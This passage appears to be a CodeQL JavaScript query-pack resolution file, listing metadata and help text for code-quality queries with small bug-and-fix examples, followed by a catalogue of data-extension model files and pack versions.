    \ `scream();`. Indentation makes it appear as if the statement `runAway();` also\
    \ belongs to the 'then' branch, while in fact it does not: it is simply the next\
    \ statement after the `if`, and will be executed regardless of whether the condition\
    \ `afraid()` evaluates to true or false.\n\n\n```javascript\nif (afraid())\n\t\
    scream();\n\trunAway();\n```\nIf both statements were intended to be part of the\
    \ 'then' branch, they should be enclosed in a block of statements like this:\n\
    \n\n```javascript\nif (afraid()) {\n\tscream();\n\trunAway();\n}\n```\nIf the\
    \ second statement does not logically belong in the 'then' branch, its indentation\
    \ should be decreased like this:\n\n\n```javascript\nif (afraid())\n\tscream();\n\
    runAway();\n```\n\n## References\n* Tutorialzine: [10 Mistakes That JavaScript\
    \ Beginners Often Make](http://tutorialzine.com/2014/04/10-mistakes-javascript-beginners-make/).\n\
    * Common Weakness Enumeration: [CWE-483](https://cwe.mitre.org/data/definitions/483.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Statements/ReturnAssignsLocal.ql
  relativeBqrsPath: codeql/javascript-queries/Statements/ReturnAssignsLocal.bqrs
  metadata:
    name: Return statement assigns local variable
    description: |-
      An assignment to a local variable in a return statement is useless, since the variable will
                    immediately go out of scope and its value is lost.
    kind: problem
    problem.severity: warning
    id: js/useless-assignment-in-return
    tags: |-
      quality
             reliability
             correctness
             external/cwe/cwe-563
    precision: very-high
  queryHelp: "# Return statement assigns local variable\nAssigning a local variable\
    \ in a return statement is useless, since the local variable will go out of scope\
    \ immediately and its new value is lost.\n\n\n## Recommendation\nClosely examine\
    \ the code in question to understand the original intention. For instance, the\
    \ assignment may originally have referred to a variable from another scope that\
    \ accidentally was shadowed due to a renaming; in this case, perform another renaming\
    \ to make it visible again. Or maybe the assignment was meant to assign to a property\
    \ of the receiver object and the programmer inadvertently forgot to qualify it\
    \ by `this`; address this by providing the required qualification. Finally, the\
    \ assignment may simply be unnecessary, in which case it can be removed.\n\n\n\
    ## Example\nIn the following example, the `getName` method of `Person` contains\
    \ a useless assignment to `name`.\n\n\n```javascript\nfunction Person(first, last,\
    \ age) {\n\tthis.first = first;\n\tthis.last = last;\n\tthis.age = age;\n}\n\n\
    Person.prototype.getName = function() {\n\tvar name = first + \" \" + last;\n\t\
    return name = name.trim();\n};\n```\nThe assignment serves no obvious purpose\
    \ and should be removed:\n\n\n```javascript\nfunction Person(first, last, age)\
    \ {\n\tthis.first = first;\n\tthis.last = last;\n\tthis.age = age;\n}\n\nPerson.prototype.getName\
    \ = function() {\n\tvar name = first + \" \" + last;\n\treturn name.trim();\n\
    };\n```\n\n## References\n* Wikipedia: [Dead store](https://en.wikipedia.org/wiki/Dead_store).\n\
    * Common Weakness Enumeration: [CWE-563](https://cwe.mitre.org/data/definitions/563.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Statements/SuspiciousUnusedLoopIterationVariable.ql
  relativeBqrsPath: codeql/javascript-queries/Statements/SuspiciousUnusedLoopIterationVariable.bqrs
  metadata:
    name: Unused loop iteration variable
    description: "A loop iteration variable is unused, which suggests an error."
    kind: problem
    problem.severity: error
    id: js/unused-loop-variable
    tags: |-
      quality
             reliability
             correctness
    precision: high
  queryHelp: "# Unused loop iteration variable\nMost `for...in` and `for...of` statements\
    \ use their iteration variable in the loop body, unless they simply count the\
    \ number of iterations by incrementing a loop counter in the loop body, or check\
    \ whether the loop body is executed at all. Loops that do not use their iteration\
    \ variable but do not fall into one of these two categories may indicate a logic\
    \ error or typo.\n\n\n## Recommendation\nCarefully check whether the loop variable\
    \ should be used. If the variable is genuinely not being used and the code is\
    \ correct, consider renaming the variable to `_` or `unused` to indicate to readers\
    \ of the code that it is intentionally unused.\n\n\n## Example\nIn this example,\
    \ the `for...of` loop iteration variable `x` is never used. It appears that the\
    \ function is intended to count how many elements of the array `xs` satisfy the\
    \ filter predicate `p`, but the programmer forgot to actually pass `x` as an argument\
    \ to `p`.\n\n\n```javascript\nfunction countOccurrences(xs, p) {\n\tvar count\
    \ = 0;\n\tfor (let x of xs)\n\t\tif (p())\n\t\t\t++count;\n\treturn count;\n}\n\
    ```\nTo fix this issue, the call `p()` should be replaced by `p(x)`.\n\n\n## References\n\
    * Mozilla Developer Network: [for...in](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...in).\n\
    * Mozilla Developer Network: [for...of](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...of).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Statements/UnreachableStatement.ql
  relativeBqrsPath: codeql/javascript-queries/Statements/UnreachableStatement.bqrs
  metadata:
    name: Unreachable statement
    description: Unreachable statements are often indicative of missing code or latent
      bugs and should be avoided.
    kind: problem
    problem.severity: warning
    id: js/unreachable-statement
    tags: |-
      quality
             reliability
             correctness
             external/cwe/cwe-561
    precision: very-high
  queryHelp: "# Unreachable statement\nAn unreachable statement almost always indicates\
    \ missing code or a latent bug and should be examined carefully.\n\n\n## Recommendation\n\
    Examine the surrounding code to determine why the statement has become unreachable.\
    \ If it is no longer needed, remove the statement.\n\n\n## Example\nIn the following\
    \ example, a spurious semicolon after the `if` condition at line 2 makes the `return`\
    \ statement on line 4 unreachable: the function will always execute the `return`\
    \ statement on line 3 first, so it will never reach line 4.\n\n\n```javascript\n\
    function f() {\n\tif (someCond());\n\t\treturn 23;\n\treturn 42;\n}\n```\nTo correct\
    \ this issue, remove the spurious semicolon:\n\n\n```javascript\nfunction f()\
    \ {\n\tif (someCond())\n\t\treturn 23;\n\treturn 42;\n}\n```\n\n## References\n\
    * Wikipedia: [Unreachable code](http://en.wikipedia.org/wiki/Unreachable_code).\n\
    * Common Weakness Enumeration: [CWE-561](https://cwe.mitre.org/data/definitions/561.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Statements/UseOfReturnlessFunction.ql
  relativeBqrsPath: codeql/javascript-queries/Statements/UseOfReturnlessFunction.bqrs
  metadata:
    name: Use of returnless function
    description: Using the return value of a function that does not return an expression
      is indicative of a mistake.
    kind: problem
    problem.severity: warning
    id: js/use-of-returnless-function
    tags: |-
      quality
             reliability
             correctness
    precision: high
  queryHelp: |
    # Use of returnless function
    JavaScript functions that do not return an expression will implicitly return `undefined`. Using the implicit return value from such a function is not an error in itself, but it is a pattern indicating that some misunderstanding has occurred.


    ## Recommendation
    Do not use the return value from a function that does not return an expression.


    ## Example
    In the example below, the function `renderText` is used to render text through side effects, and the function does not return an expression. However, the programmer still uses the return value from `renderText` as if the function returned an expression, which is clearly an error.


    ```javascript
    var stage = require("./stage")

    function renderText(text, id) {
        document.getElementById(id).innerText = text;
    }

    var text = renderText("Two households, both alike in dignity", "scene");

    stage.show(text);
    ```
    The program can be fixed either by removing the use of the value returned by `renderText`, or by changing the `renderText` function to return an expression.


    ## References
    * Mozilla Developer Network: [Return](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/return).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Statements/UselessComparisonTest.ql
  relativeBqrsPath: codeql/javascript-queries/Statements/UselessComparisonTest.bqrs
  metadata:
    name: Useless comparison test
    description: |-
      A comparison that always evaluates to true or always evaluates to false may
                    indicate faulty logic and dead code.
    kind: problem
    problem.severity: warning
    id: js/useless-comparison-test
    tags: |-
      quality
             reliability
             correctness
    precision: high
  queryHelp: |
    # Useless comparison test
    If a condition always evaluates to true or always evaluates to false, this often indicates incomplete code or a latent bug, and it should be examined carefully.


    ## Recommendation
    Examine the surrounding code to determine why the condition is redundant. If it is no longer needed, remove it.

    If the check is needed to guard against `NaN` values, insert a comment explaining the possibility of `NaN`.


    ## Example
    The following example finds the index of an element in a given slice of the array:


    ```javascript
    function findValue(values, x, start, end) {
      let i;
      for (i = start; i < end; ++i) {
        if (values[i] === x) {
            return i;
        }
      }
      if (i < end) {
        return i;
      }
      return -1;
    }

    ```
    The condition `i < end` at the end is always false, however. The code can be clarified if the redundant condition is removed:


    ```javascript
    function findValue(values, x, start, end) {
      for (let i = start; i < end; ++i) {
        if (values[i] === x) {
            return i;
        }
      }
      return -1;
    }

    ```

    ## References
    * Mozilla Developer Network: [Truthy](https://developer.mozilla.org/en-US/docs/Glossary/Truthy), [Falsy](https://developer.mozilla.org/en-US/docs/Glossary/Falsy).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Statements/UselessConditional.ql
  relativeBqrsPath: codeql/javascript-queries/Statements/UselessConditional.bqrs
  metadata:
    name: Useless conditional
    description: |-
      If a conditional expression always evaluates to true or always
                    evaluates to false, this suggests incomplete code or a logic
                    error.
    kind: problem
    problem.severity: warning
    id: js/trivial-conditional
    tags: |-
      quality
             reliability
             correctness
             external/cwe/cwe-570
             external/cwe/cwe-571
    precision: very-high
  queryHelp: |
    # Useless conditional
    If a condition always evaluates to true or always evaluates to false, this often indicates incomplete code or a latent bug and should be examined carefully.


    ## Recommendation
    Examine the surrounding code to determine why the condition is useless. If it is no longer needed, remove it.


    ## Example
    The following example constructs an array `lines`, and then attempts to check whether it has any elements by means of an if conditional `if (!lines)`.


    ```javascript
    function getLastLine(input) {
      var lines = [], nextLine;
      while ((nextLine = readNextLine(input)))
        lines.push(nextLine);
      if (!lines)
        throw new Error("No lines!");
      return lines[lines.length-1];
    }
    ```
    Note that in JavaScript (unlike some other languages) arrays and objects are always considered to be true when evaluated in a Boolean context. The code should instead check `lines.length`:


    ```javascript
    function getLastLine(input) {
      var lines = [], nextLine;
      while ((nextLine = readNextLine(input)))
        lines.push(nextLine);
      if (!lines.length)
        throw new Error("No lines!");
      return lines[lines.length-1];
    }
    ```

    ## References
    * Mozilla Developer Network: [Truthy](https://developer.mozilla.org/en-US/docs/Glossary/Truthy), [Falsy](https://developer.mozilla.org/en-US/docs/Glossary/Falsy).
    * Common Weakness Enumeration: [CWE-570](https://cwe.mitre.org/data/definitions/570.html).
    * Common Weakness Enumeration: [CWE-571](https://cwe.mitre.org/data/definitions/571.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Summary/LinesOfCode.ql
  relativeBqrsPath: codeql/javascript-queries/Summary/LinesOfCode.bqrs
  metadata:
    id: js/summary/lines-of-code
    name: Total lines of JavaScript and TypeScript code in the database
    description: "The total number of lines of JavaScript or TypeScript code across\
      \ all files checked into the repository, except in `node_modules`. This is a\
      \ useful metric of the size of a database. For all files that were seen during\
      \ extraction, this query counts the lines of code, excluding whitespace or comments."
    kind: metric
    tags: |-
      summary
             telemetry
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Summary/LinesOfUserCode.ql
  relativeBqrsPath: codeql/javascript-queries/Summary/LinesOfUserCode.bqrs
  metadata:
    name: Total lines of user written JavaScript and TypeScript code in the database
    description: |-
      The total number of lines of JavaScript and TypeScript code from the source code directory,
         excluding auto-generated files and files in `node_modules`. This query counts the lines of code, excluding
         whitespace or comments.
    kind: metric
    tags: |-
      summary
             lines-of-code
             debug
    id: js/summary/lines-of-user-code
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Vue/ArrowMethodOnVueInstance.ql
  relativeBqrsPath: codeql/javascript-queries/Vue/ArrowMethodOnVueInstance.bqrs
  metadata:
    name: Arrow method on Vue instance
    description: An arrow method on a Vue instance doesn't have its `this` variable
      bound to the Vue instance.
    kind: problem
    problem.severity: warning
    id: js/vue/arrow-method-on-vue-instance
    tags: |-
      quality
             reliability
             correctness
             frameworks/vue
    precision: high
  queryHelp: |
    # Arrow method on Vue instance
    The Vue framework invokes the methods of a Vue instance with the instance as the receiver. It is however impossible to perform this binding of instance and receiver for arrow functions, so the `this` variable in an arrow function on a Vue instance may not have the value that the programmer expects.


    ## Recommendation
    Ensure that the methods on a Vue instance can have their receiver bound to the instance.


    ## Example
    The following example shows two similar Vue instances, the only difference is how the `created` life cycle hook callback is defined. The first Vue instance uses an arrow function as the callback. This means that the `this` variable will have the global object as its value, causing `this.myProperty` to evaluate to `undefined`, which may not be intended. Instead, the second Vue instance uses an ordinary function as the callback, causing `this.myProperty` to evaluate to `42`.


    ```javascript
    new Vue({
      data: {
        myProperty: 42
      },
      created: () => {
        // BAD: prints: "myProperty is: undefined"
        console.log('myProperty is: ' + this.myProperty);
      }
    });

    new Vue({
      data: {
        myProperty: 42
      },
      created: function () {
        // GOOD: prints: "myProperty is: 1"
        console.log('myProperty is: ' + this.myProperty);
      }
    });

    ```

    ## References
    * Vue documentation: [The Vue Instance](https://vuejs.org/v2/guide/instance.html)
extensionPacks: []
packs:
  codeql/javascript-queries#0:
    name: codeql/javascript-queries
    version: 2.1.2
    isLibrary: false
    isExtensionPack: false
    localPath: file:///Users/fermin/.codeql/packages/codeql/javascript-queries/2.1.2/
    localPackDefinitionFile: file:///Users/fermin/.codeql/packages/codeql/javascript-queries/2.1.2/qlpack.yml
    headSha: aa3000df1310b332ba1c84afec3bacb0aeb4dbbd
    runDataExtensions:
     -
      pack: codeql/javascript-all#1
      relativePath: ext/apollo-server.model.yml
      index: 0
      firstRowId: 0
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/apollo-server.model.yml
      index: 1
      firstRowId: 1
      rowCount: 2
      locations:
        lineNumbers: A=12+1
        columnNumbers: A=9*2
     -
      pack: codeql/javascript-all#1
      relativePath: ext/apollo-server.model.yml
      index: 2
      firstRowId: 3
      rowCount: 10
      locations:
        lineNumbers: A=19+1*9
        columnNumbers: A=9*10
     -
      pack: codeql/javascript-all#1
      relativePath: ext/aws-sdk.model.yml
      index: 0
      firstRowId: 13
      rowCount: 8
      locations:
        lineNumbers: A=6+1*7
        columnNumbers: A=9*8
     -
      pack: codeql/javascript-all#1
      relativePath: ext/aws-sdk.model.yml
      index: 1
      firstRowId: 21
      rowCount: 10
      locations:
        lineNumbers: A=18+1*9
        columnNumbers: A=9*10
     -
      pack: codeql/javascript-all#1
      relativePath: ext/aws-sdk.model.yml
      index: 2
      firstRowId: 31
      rowCount: 8
      locations:
        lineNumbers: A=32+1*7
        columnNumbers: A=9*8
     -
      pack: codeql/javascript-all#1
      relativePath: ext/aws-sdk.model.yml
      index: 3
      firstRowId: 39
      rowCount: 9
      locations:
        lineNumbers: A=44+1*8
        columnNumbers: A=9*9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/axios.model.yml
      index: 0
      firstRowId: 48
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/axios.model.yml
      index: 1
      firstRowId: 49
      rowCount: 1
      locations:
        lineNumbers: A=12
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/call-me-maybe.model.yml
      index: 0
      firstRowId: 50
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/cors.model.yml
      index: 0
      firstRowId: 51
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/default-threat-models-fixup.model.yml
      index: 0
      firstRowId: 52
      rowCount: 1
      locations:
        lineNumbers: A=8
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/graph-ql.model.yml
      index: 0
      firstRowId: 53
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/graph-ql.model.yml
      index: 1
      firstRowId: 54
      rowCount: 1
      locations:
        lineNumbers: A=11
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/hana-db-client.model.yml
      index: 0
      firstRowId: 55
      rowCount: 4
      locations:
        lineNumbers: A=6+1*3
        columnNumbers: A=9*4
     -
      pack: codeql/javascript-all#1
      relativePath: ext/hana-db-client.model.yml
      index: 1
      firstRowId: 59
      rowCount: 2
      locations:
        lineNumbers: A=15+1
        columnNumbers: A=9*2
     -
      pack: codeql/javascript-all#1
      relativePath: ext/hana-db-client.model.yml
      index: 2
      firstRowId: 61
      rowCount: 6
      locations:
        lineNumbers: A=22+1*5
        columnNumbers: A=9*6
     -
      pack: codeql/javascript-all#1
      relativePath: ext/make-dir.model.yml
      index: 0
      firstRowId: 67
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/markdown-table.model.yml
      index: 0
      firstRowId: 68
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/mkdirp.model.yml
      index: 0
      firstRowId: 69
      rowCount: 2
      locations:
        lineNumbers: A=6+1
        columnNumbers: A=9*2
     -
      pack: codeql/javascript-all#1
      relativePath: ext/open.model.yml
      index: 0
      firstRowId: 71
      rowCount: 2
      locations:
        lineNumbers: A=6+1
        columnNumbers: A=9*2
     -
      pack: codeql/javascript-all#1
      relativePath: ext/react-relay-threat.model.yml
      index: 0
      firstRowId: 73
      rowCount: 10
      locations:
        lineNumbers: A=6+1*9
        columnNumbers: A=9*10
     -
      pack: codeql/javascript-all#1
      relativePath: ext/react.model.yml
      index: 0
      firstRowId: 83
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/rimraf.model.yml
      index: 0
      firstRowId: 84
      rowCount: 3
      locations:
        lineNumbers: A=6+1*2
        columnNumbers: A=9*3
     -
      pack: codeql/javascript-all#1
      relativePath: ext/shelljs.model.yml
      index: 0
      firstRowId: 87
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: ext/tanstack.model.yml
      index: 0
      firstRowId: 88
      rowCount: 6
      locations:
        lineNumbers: A=6+1*5
        columnNumbers: A=9*6
     -
      pack: codeql/javascript-all#1
      relativePath: ext/underscore.string.model.yml
      index: 0
      firstRowId: 94
      rowCount: 5
      locations:
        lineNumbers: A=6+1*4
        columnNumbers: A=9*5
     -
      pack: codeql/javascript-all#1
      relativePath: ext/underscore.string.model.yml
      index: 1
      firstRowId: 99
      rowCount: 20
      locations:
        lineNumbers: A=16+1*19
        columnNumbers: A=9*20
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/NoSQL.model.yml
      index: 0
      firstRowId: 119
      rowCount: 4
      locations:
        lineNumbers: A=8+3+1*2
        columnNumbers: A=9*4
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/NodeJSLib.model.yml
      index: 0
      firstRowId: 123
      rowCount: 5
      locations:
        lineNumbers: A=6+1*4
        columnNumbers: A=9*5
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/SQL.model.yml
      index: 0
      firstRowId: 128
      rowCount: 5
      locations:
        lineNumbers: A=6+1*4
        columnNumbers: A=9*5
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/SQL.model.yml
      index: 1
      firstRowId: 133
      rowCount: 4
      locations:
        lineNumbers: A=16+1*3
        columnNumbers: A=9*4
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/helmet/Helmet.Required.Setting.model.yml
      index: 0
      firstRowId: 137
      rowCount: 2
      locations:
        lineNumbers: A=6+1
        columnNumbers: A=9*2
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/minimongo/model.yml
      index: 0
      firstRowId: 139
      rowCount: 75
      locations:
        lineNumbers: A=6+1*74
        columnNumbers: A=9*75
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/mongodb/model.yml
      index: 0
      firstRowId: 214
      rowCount: 26
      locations:
        lineNumbers: A=6+1*25
        columnNumbers: A=9*26
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/mongodb/model.yml
      index: 1
      firstRowId: 240
      rowCount: 611
      locations:
        lineNumbers: A=37+1*610
        columnNumbers: A=9*611
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/mongodb/model.yml
      index: 2
      firstRowId: 851
      rowCount: 32
      locations:
        lineNumbers: A=653+1*31
        columnNumbers: A=9*32
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/mongodb/model.yml
      index: 3
      firstRowId: 883
      rowCount: 102
      locations:
        lineNumbers: A=690+1*101
        columnNumbers: A=9*102
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/mssql/model.yml
      index: 0
      firstRowId: 985
      rowCount: 34
      locations:
        lineNumbers: A=6+1*33
        columnNumbers: A=9*34
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/mysql/model.yml
      index: 0
      firstRowId: 1019
      rowCount: 57
      locations:
        lineNumbers: A=6+1*56
        columnNumbers: A=9*57
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/mysql/model.yml
      index: 1
      firstRowId: 1076
      rowCount: 3
      locations:
        lineNumbers: A=68+1*2
        columnNumbers: A=9*3
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/pg/model.yml
      index: 0
      firstRowId: 1079
      rowCount: 65
      locations:
        lineNumbers: A=6+1*64
        columnNumbers: A=9*65
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/pg/model.yml
      index: 1
      firstRowId: 1144
      rowCount: 5
      locations:
        lineNumbers: A=76+1*4
        columnNumbers: A=9*5
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/pg/model.yml
      index: 2
      firstRowId: 1149
      rowCount: 23
      locations:
        lineNumbers: A=86+1*22
        columnNumbers: A=9*23
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/sequelize/model.yml
      index: 0
      firstRowId: 1172
      rowCount: 7
      locations:
        lineNumbers: A=6+1*6
        columnNumbers: A=9*7
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/sequelize/model.yml
      index: 1
      firstRowId: 1179
      rowCount: 248
      locations:
        lineNumbers: A=18+1*247
        columnNumbers: A=9*248
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/sequelize/model.yml
      index: 2
      firstRowId: 1427
      rowCount: 5
      locations:
        lineNumbers: A=271+1*4
        columnNumbers: A=9*5
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/sequelize/model.yml
      index: 3
      firstRowId: 1432
      rowCount: 2
      locations:
        lineNumbers: A=281+1
        columnNumbers: A=9*2
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/spanner/model.yml
      index: 0
      firstRowId: 1434
      rowCount: 174
      locations:
        lineNumbers: A=6+1*173
        columnNumbers: A=9*174
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/spanner/model.yml
      index: 1
      firstRowId: 1608
      rowCount: 5
      locations:
        lineNumbers: A=185+1*4
        columnNumbers: A=9*5
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/sqlite3/model.yml
      index: 0
      firstRowId: 1613
      rowCount: 15
      locations:
        lineNumbers: A=6+1*14
        columnNumbers: A=9*15
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/frameworks/sqlite3/model.yml
      index: 1
      firstRowId: 1628
      rowCount: 3
      locations:
        lineNumbers: A=26+1*2
        columnNumbers: A=9*3
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/security/domains/IntegrityCheckingRequired/integrity_checking_required.model.yml
      index: 0
      firstRowId: 1631
      rowCount: 3
      locations:
        lineNumbers: A=6+1*2
        columnNumbers: A=9*3
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/security/domains/compromised/compromised_domains.model.yml
      index: 0
      firstRowId: 1634
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/javascript-all#1
      relativePath: semmle/javascript/security/domains/untrusted/untrusted_domains.model.yml
      index: 0
      firstRowId: 1635
      rowCount: 6
      locations:
        lineNumbers: A=7+1+3+1*3
        columnNumbers: A=9*6
     -
      pack: codeql/threat-models#2
      relativePath: ext/supported-threat-models.model.yml
      index: 0
      firstRowId: 1641
      rowCount: 1
      locations:
        lineNumbers: A=6
        columnNumbers: A=9
     -
      pack: codeql/threat-models#2
      relativePath: ext/threat-model-grouping.model.yml
      index: 0
      firstRowId: 1642
      rowCount: 15
      locations:
        lineNumbers: A=8+3+1+3+1*5+3+1+5+1*3
        columnNumbers: A=9*15
  codeql/util#3:
    name: codeql/util
    version: 2.0.20
    isLibrary: true
    isExtensionPack: false
    localPath: file:///Users/fermin/.codeql/packages/codeql/javascript-queries/2.1.2/.codeql/libraries/codeql/util/2.0.20/
    localPackDefinitionFile: file:///Users/fermin/.codeql/packages/codeql/javascript-queries/2.1.2/.codeql/libraries/codeql/util/2.0.20/qlpack.yml
    headSha: aa3000df1310b332ba1c84afec3bacb0aeb4dbbd
    runDataExtensions: []
  codeql/javascript-all#1:
    name: codeql/javascript-all
    version: 2.6.13
    isLibrary: true
    isExtensionPack: false
    localPath: file:///Users/fermin/.codeql/packages/codeql/javascript-queries/2.1.2/.codeql/libraries/codeql/javascript-all/2.6.13/
    localPackDefinitionFile: file:///Users/fermin/.codeql/packages/codeql/javascript-queries/2.1.2/.codeql/libraries/codeql/javascript-all/2.6.13/qlpack.yml
    headSha: aa3000df1310b332ba1c84afec3bacb0aeb4dbbd
    runDataExtensions: []
  codeql/threat-models#2:
    name: codeql/threat-models
    version: 1.0.33
    isLibrary: true
    isExtensionPack: false
    localPath: file:///Users/fermin/.codeql/packages/codeql/javascript-queries/2.1.2/.codeql/libraries/codeql/threat-models/1.0.33/
    localPackDefinitionFile: file:///Users/fermin/.codeql/packages/codeql/javascript-queries/2.1.2/.codeql/libraries/codeql/threat-models/1.0.33/qlpack.yml
    headSha: aa3000df1310b332ba1c84afec3bacb0aeb4dbbd
    runDataExtensions: []
